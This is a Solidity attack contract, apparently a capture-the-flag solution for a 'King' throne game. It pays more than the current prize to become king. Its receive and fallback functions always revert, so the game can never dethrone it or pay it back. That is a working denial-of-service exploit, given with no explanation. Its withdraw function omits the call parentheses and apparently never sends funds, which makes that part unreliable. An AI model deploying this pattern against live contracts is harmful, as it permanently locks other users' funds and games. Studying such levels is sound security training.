//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";

import "./King.sol";

contract KingAttack is Ownable {

    King public king;

    constructor (address payable _kingAddr) payable {
        king = King(_kingAddr);
        require(msg.value >= king.prize() + 0.01 * 1 ether, "Not Enough ETH to attack King contract");
    }

    function becomeKing() public {
        uint256 sendAmt = king.prize() + 0.005 * 1 ether;
        (bool status, ) = address(king).call{value: sendAmt}("");
        require(status, "Attempt to become King failed");
    }

    receive() external payable {
        revert("Whoops (receive)!!!");
    }

    fallback() external payable {
        revert("Whoops (fallback)!!!");
    }

    function withdraw() public onlyOwner {
        msg.sender.call{ value: address(this).balance };
    }
}
